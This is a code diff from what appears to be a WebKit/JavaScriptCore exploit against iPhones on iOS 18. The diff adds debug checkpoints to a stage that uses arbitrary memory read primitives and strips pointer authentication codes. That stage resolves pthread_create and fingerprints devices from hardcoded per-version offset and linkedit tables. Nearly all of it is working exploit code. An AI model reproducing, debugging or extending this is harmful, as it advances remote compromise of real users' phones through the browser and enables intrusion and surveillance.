@@ -17476,6 +17476,11 @@ async function _aarw_main() {
               }
           })();
           print("jsc_base now: " + jsc_base.hex());
+          function resolverCheckpoint(message) {
+              print("resolver: " + message);
+              sleep(10);
+          }
+          resolverCheckpoint("post-jsc-base");
           function parse_adrp(addr) {
               const x = Number(read32(addr));
               const immhi = x >> 5 & (1 << 23 - 5 + 1) - 1;
@@ -17493,6 +17498,7 @@ async function _aarw_main() {
               let add = parse_add(addr + 4n);
               return res + add;
           }
+          resolverCheckpoint("parser helpers ready");
           const versions = ['b8', '731', 'b9'];
 const pthread_create_auth_stubs_offset = {
 '18,0': [0x16b961cn],
@@ -17528,6 +17534,7 @@ const pthread_create_offset = {
 '18,6,1': [0x6988n],
 '18,6,2': [0x6988n]
 };
+resolverCheckpoint("pthread candidate maps ready");
 const linkedit_to_device = {
 '18,0': {
     [0x26ae10000n]: "iPhone11,8_22A3354",
@@ -17675,6 +17682,7 @@ const linkedit_to_device = {
     [0x271de4000n]: "iPhone17,5_22G100"
 }
 };
+resolverCheckpoint("linkedit map ready");
 const device_chipset = {
 "iPhone17,1_22C152": "6149d995753968891870832e3fec9195",
 "iPhone16,1_22C152": "c33e4990a9d3afe948b98d7d4205d596",
@@ -17876,6 +17884,7 @@ const device_chipset = {
 "iPhone14,2_22D72": "c90776dbac058ed6957f476e287867f8",
 "iPhone14,2_22D82": "c90776dbac058ed6957f476e287867f8",
 "iPhone15,3_22D63": "22f32fd975a694d340a6ad22b872b1ae",};
+          resolverCheckpoint("device chipset map ready");
 
           const ios_version = (function() {
           let version = /iPhone OS ([0-9_]+)/g.exec(navigator.userAgent)?.[1];
@@ -17884,6 +17893,7 @@ const device_chipset = {
               }
           })();
           print(`ios_version: ${ios_version}`);
+          resolverCheckpoint(`ios_version parsed=${ios_version}`);
           function offset_candidates(map, key) {
               const value = map[key];
               if (Array.isArray(value)) return value;
@@ -17901,20 +17911,28 @@ const device_chipset = {
           let selected_pthread_create_offset = 0n;
           const auth_stub_candidates = offset_candidates(pthread_create_auth_stubs_offset, ios_version);
           const pthread_offset_candidates = offset_candidates(pthread_create_offset, ios_version);
+          resolverCheckpoint(`linkedit candidates=${Object.keys(linkedit_map).length} auth_stub_candidates=${auth_stub_candidates.map(x => x.hex()).join(",")} pthread_offset_candidates=${pthread_offset_candidates.map(x => x.hex()).join(",")}`);
           for (const auth_stub_offset of auth_stub_candidates) {
               let candidate_got;
               let candidate_pthread_create;
               try {
-                  candidate_got = BigInt(parse_adrp_add(jsc_base + auth_stub_offset));
+                  const auth_stub_addr = jsc_base + auth_stub_offset;
+                  resolverCheckpoint(`trying auth_stub_offset=${auth_stub_offset.hex()} addr=${auth_stub_addr.hex()}`);
+                  candidate_got = BigInt(parse_adrp_add(auth_stub_addr));
+                  resolverCheckpoint(`candidate_got=${candidate_got.hex()}`);
                   candidate_pthread_create = read64(candidate_got).noPAC();
+                  resolverCheckpoint(`candidate_pthread_create=${candidate_pthread_create.hex()}`);
               } catch (e) {
+                  resolverCheckpoint(`auth_stub_offset=${auth_stub_offset.hex()} failed: ${e}`);
                   continue;
               }
               for (const pthread_offset of pthread_offset_candidates) {
                   try {
                       const candidate_base = candidate_pthread_create - pthread_offset;
+                      resolverCheckpoint(`trying pthread_offset=${pthread_offset.hex()} base=${candidate_base.hex()} linkedit_addr=${(candidate_base + 0x600n).hex()}`);
                       const candidate_linkedit = read64(candidate_base + 0x600n);
                       const candidate_device_model = linkedit_map[candidate_linkedit];
+                      resolverCheckpoint(`candidate_linkedit=${candidate_linkedit.hex()} device=${candidate_device_model || "(unknown)"}`);
                       if (!candidate_device_model) continue;
                       pthread_create_got = candidate_got;
                       pthread_create = candidate_pthread_create;
@@ -17924,7 +17942,9 @@ const device_chipset = {
                       selected_pthread_create_offset = pthread_offset;
                       device_model = candidate_device_model;
                       break;
-                  } catch (e) {}
+                  } catch (e) {
+                      resolverCheckpoint(`pthread_offset=${pthread_offset.hex()} failed: ${e}`);
+                  }
               }
               if (device_model) break;
           }
